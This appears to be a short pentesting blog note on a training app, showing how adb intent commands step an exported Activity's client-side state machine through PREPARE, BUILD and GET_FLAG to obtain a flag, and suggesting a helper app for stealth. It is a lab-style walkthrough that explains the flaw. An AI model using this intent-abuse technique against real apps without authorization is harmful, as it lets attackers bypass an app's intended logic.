---

title: "Android Pentesting Notes – Intent Exploitation via State Machines"
date: 2025-12-22 10:00:00 +0200
categories: [Android, Mobile Security]
tags: [android, intents, logic-bugs, adb, pentesting]
toc: true
---------

## TL;DR

* Intents can control application logic
* Client-side state machines are exploitable
* adb is a valid attacker tool

---

## Context

This note documents abusing **Intent-driven state machines** in exported Activities using the Hextree Attack Surface app.

---

## Entry Point

```java
protected void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    stateMachine(getIntent());
}
```

Every Activity launch triggers the state machine.

---

## State Storage

```java
SolvedPreferences.getInt("state");
```

* State stored in SharedPreferences
* Default state: `INIT`

---

## State Machine Breakdown

### INIT → PREPARE

* Action: `PREPARE_ACTION`

### PREPARE → BUILD

* Action: `BUILD_ACTION`

### BUILD → GET_FLAG

* Action: `GET_FLAG_ACTION`

### GET_FLAG

* No action required
* `success()` executed
* State resets

---

## Mental Model

```text
INIT → PREPARE → BUILD → GET_FLAG → SUCCESS
```

---

## Exploitation via adb

```bash
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a PREPARE_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a BUILD_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity -a GET_FLAG_ACTION
adb shell am start -n io.hextree.attacksurface/.activities.Flag4Activity
```

---

## Alternative: Helper App

* Build a minimal Android app
* Send crafted Intents programmatically
* Same logic abuse, more stealth

---

## Why This Is a Vulnerability

* No caller verification
* State fully client-side
* Any app can advance logic

> The app is a state-based game — adb lets us skip levels.

---

## Image

![State machine diagram (INIT → PREPARE → BUILD → GET_FLAG)] (/assets/img/intent-state-machine.png)
```
┌─────────┐
│  INIT   │
└────┬────┘
     │ PREPARE_ACTION
     ▼
┌─────────┐
│ PREPARE │
└────┬────┘
     │ BUILD_ACTION
     ▼
┌─────────┐
│  BUILD  │
└────┬────┘
     │ GET_FLAG_ACTION
     ▼
┌──────────┐
│ GET_FLAG │
└────┬─────┘
     │ (any Intent)
     ▼
┌──────────┐
│ SUCCESS  │  → FLAG
└────┬─────┘
     ▼
   INIT
```
---

## Key Takeaways

* Logic flaws beat memory bugs
* Intents are high-risk entry points
* Client-side trust is dangerous
